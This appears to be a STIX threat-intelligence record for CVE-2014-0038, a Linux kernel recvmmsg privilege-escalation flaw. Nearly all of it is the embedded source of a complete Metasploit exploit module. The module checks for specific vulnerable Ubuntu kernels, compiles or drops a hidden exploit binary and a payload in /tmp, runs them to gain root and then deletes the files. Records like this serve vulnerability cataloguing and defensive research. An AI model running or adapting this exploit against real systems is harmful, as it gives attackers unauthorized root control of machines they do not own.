{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c8a11659-9cbe-485c-886e-00090a42e315",
    "created": "2024-08-14T16:59:31.195935Z",
    "modified": "2024-08-14T16:59:31.195939Z",
    "name": "Linux Kernel recvmmsg Privilege Escalation",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/recvmmsg_priv_esc.rb",
            "external_id": "recvmmsg_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0038"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1453900"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Linux Kernel recvmmsg Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to exploit CVE-2014-0038, by sending a recvmmsg\n        system call with a crafted timeout pointer parameter to gain root.\n\n        This exploit has offsets for 3 Ubuntu 13 kernels:\n        3.8.0-19-generic (13.04 default);\n        3.11.0-12-generic (13.10 default);\n        3.11.0-15-generic (13.10).\n\n        This exploit may take up to 13 minutes to run due to a decrementing\n        (1/sec) pointer which starts at 0xff*3 (765 seconds)\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'h00die <mike@shorebreaksecurity.com>', # Metasploit module\n          'rebel' # Discovery and exploit\n        ],\n      'DisclosureDate' => '2014-02-02',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64  ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'Privileged'     => true,\n      'DefaultOptions' => { 'WfsDelay' => 780, 'PrependFork' => true },\n      'References'     =>\n        [\n          [ 'BID', '65255' ],\n          [ 'CVE', '2014-0038' ],\n          [ 'EDB', '31347' ],\n          [ 'EDB', '31346' ],\n          [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1453900' ]\n        ],\n      'DefaultTarget'  => 0))\n    register_options [\n      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w(Auto True False) ])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    write_file path, data\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    cmd_exec \"chmod +x '#{path}'\"\n  end\n\n  def upload_and_compile(path, data)\n    upload \"#{path}.c\", data\n    gcc_cmd = \"gcc -o #{path} #{path}.c\"\n    if session.type.eql? 'shell'\n      gcc_cmd = \"PATH=$PATH:/usr/bin/ #{gcc_cmd}\"\n    end\n\n    output = cmd_exec gcc_cmd\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile\"\n    end\n\n    cmd_exec \"chmod +x #{path}\"\n  end\n\n  def strip_comments(c_code)\n    c_code.gsub(%r{/\\*.*?\\*/}m, '').gsub(%r{^\\s*//.*$}, '')\n  end\n\n  def exploit_data(file)\n    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-0038', file)\n  end\n\n  def live_compile?\n    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')\n\n    if has_gcc?\n      vprint_good 'gcc is installed'\n      return true\n    end\n\n    unless datastore['COMPILE'].eql? 'Auto'\n      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'\n    end\n  end\n\n  def check\n    arch = kernel_hardware\n    unless arch.include? 'x86_64'\n      vprint_error \"System architecture #{arch} is not supported\"\n      return CheckCode::Safe\n    end\n    vprint_good \"System architecture #{arch} is supported\"\n\n    version = kernel_version\n    unless version.include? 'Ubuntu'\n      vprint_error \"System kernel #{version} is not based on Ubuntu\"\n      return CheckCode::Safe\n    end\n    vprint_good 'System kernel is based on Ubuntu'\n\n    # Ubuntu 12.x kernels are not supported\n    if version.include? 'precise'\n      vprint_error \"System kernel #{version} is not exploitable\"\n      return CheckCode::Safe\n    end\n\n    release = kernel_release\n    unless release =~ /^3\\.11\\.0-(12|15)-generic/ || release.eql?('3.8.0-19-generic')\n      vprint_error \"Kernel #{release} #{version} is not exploitable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Kernel #{release} #{version} is exploitable\"\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # Upload exploit executable\n    executable_name = \".#{rand_text_alphanumeric rand(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      upload_and_compile executable_path, strip_comments(exploit_data('recvmmsg.c'))\n      rm_f \"#{executable_path}.c\"\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx executable_path, exploit_data('recvmmsg')\n    end\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Launch exploit\n    timeout = 780\n    print_status \"Launching exploit... May take up to 13 minutes. Start time: #{Time.now}\"\n    output = cmd_exec \"echo '#{payload_path} & exit' | #{executable_path}\", nil, timeout\n    output.each_line { |line| vprint_status line.chomp }\n    print_status \"Cleaning up #{payload_path} and #{executable_path}...\"\n    rm_f executable_path\n    rm_f payload_path\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-02-02",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}